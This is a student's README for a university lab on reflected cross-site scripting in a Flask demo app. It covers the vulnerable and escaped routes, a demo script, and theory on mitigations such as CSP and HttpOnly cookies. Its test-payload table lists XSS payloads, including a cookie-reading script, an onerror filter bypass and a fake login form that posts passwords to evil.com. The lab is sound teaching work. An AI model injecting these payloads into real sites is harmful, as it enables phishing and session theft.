# Reflected XSS — CyberSec Lab 3

## Quick Start

```bash
cd xss_reflected
pip install flask
python app.py
```

Then open **http://127.0.0.1:5000/** in your browser.

---

## What This Demo Shows

| Requirement | What's Implemented |
|---|---|
| **(a) Vulnerable implementation** | `/search/vulnerable` — user input from `?q=` is reflected directly into HTML without encoding ([app.py, line ~193](app.py)) |
| **(b) Working exploit** | 5 ready-to-click payloads on the search page (script alert, cookie theft, img onerror, HTML injection, fake login form) |
| **(c) Root cause** | User-controlled input is concatenated into the HTML response without encoding. The browser interprets `<script>` tags as executable JavaScript. |
| **(d) Mitigation implemented** | `/search/safe` — applies `html.escape()` (context-aware output encoding) before embedding input in HTML ([app.py, line ~225](app.py)) |
| **(e) Other mitigations (theory)** | See section below |

---

## Video Demo Script (2-3 minutes)

### Step 1: Show the Vulnerable Page (~45 sec)
1. Open `http://127.0.0.1:5000/` → click **"Vulnerable Version"**
2. Search for `Mouse` → show it works normally
3. Now paste the XSS payload in the search box:
   ```
   <script>alert('XSS')</script>
   ```
4. Press Search → **an alert box pops up** — script execution confirmed!
5. Show the URL bar — the payload is in the `?q=` parameter. Explain: _"An attacker would send this crafted URL to a victim via email or chat. When the victim clicks it, the script runs in their browser session."_

### Step 2: Show the Root Cause (~30 sec)
- Scroll down to the **"Vulnerable Code Path"** box on the page, or open `app.py` and point to:
  ```python
  query_display = query  # ← THIS IS THE VULNERABILITY
  ```
- Explain: _"The user input goes directly into the HTML. The browser sees `<script>` and executes it."_

### Step 3: Show the Mitigated Page (~45 sec)
1. Go back to Home → click **"Mitigated Version"**
2. Click the **same payload** link → the `<script>` tag appears as **plain text** on the page. No alert. No execution.
3. Show the **"Mitigated Code Path"** box:
   ```python
   query_display = html.escape(query)  # ← THIS IS THE FIX
   ```
- Explain: _"`html.escape()` converts `<` to `&lt;` and `>` to `&gt;`. The browser renders these as visible characters, not as HTML tags."_

### Step 4: Discuss Other Mitigations (~45 sec)
Read the section below on camera.

---

## (e) Other Mitigations — Theory

The mitigation I implemented is **context-aware output encoding** (`html.escape()`). Here are the other defences from the lecture slides and why they work:

| Mitigation | How it works |
|---|---|
| **Framework auto-escaping** | Templating engines like Jinja2 (with `{{ variable }}`) automatically HTML-encode all variables by default, preventing developers from forgetting to encode manually. |
| **HTML sanitiser for rich content** | Libraries like DOMPurify or Bleach parse HTML and strip/allow only a whitelist of safe tags and attributes, so even if raw HTML is needed (e.g., rich-text editors), dangerous elements like `<script>` or `onerror` are removed. |
| **Content Security Policy (CSP)** | An HTTP header (`Content-Security-Policy`) that instructs the browser to only execute scripts from trusted sources. Even if an XSS payload is injected, the browser refuses to run inline scripts or scripts from unauthorised origins. |
| **HttpOnly cookies** | Setting the `HttpOnly` flag on session cookies prevents JavaScript from reading them via `document.cookie`, limiting the damage of XSS attacks that attempt cookie theft. |
| **Safe DOM sinks** | Using `.textContent` or `.innerText` instead of `.innerHTML` in JavaScript ensures that dynamically inserted content is treated as text, not parsed as HTML. This prevents DOM-based XSS. |

---

## Ownership Declaration

| Member Name | Roll Number | Category | Variant Implemented |
|---|---|---|---|
| *Anurag* | *IIT2024156* | Cross-Site Scripting (XSS) | Reflected XSS |

---

## Project Structure

```
xss_reflected/
├── app.py          # Flask app with vulnerable + mitigated routes
└── README.md       # This file
```

## Test Payloads

| # | Payload | Purpose |
|---|---|---|
| 1 | `<script>alert('XSS')</script>` | Basic proof of script execution |
| 2 | `<script>alert('Cookies: '+document.cookie)</script>` | Simulates cookie theft |
| 3 | `<img src=x onerror=alert('XSS-via-img')>` | Bypasses naive `<script>` tag filters |
| 4 | `<h1 style="color:red">HACKED!</h1>` | HTML injection / page defacement |
| 5 | `<form action="https://evil.com/steal"><input placeholder="Enter password"><button>Login</button></form>` | Phishing via injected fake login form |

All five are pre-built as clickable links on the search pages for easy demo.

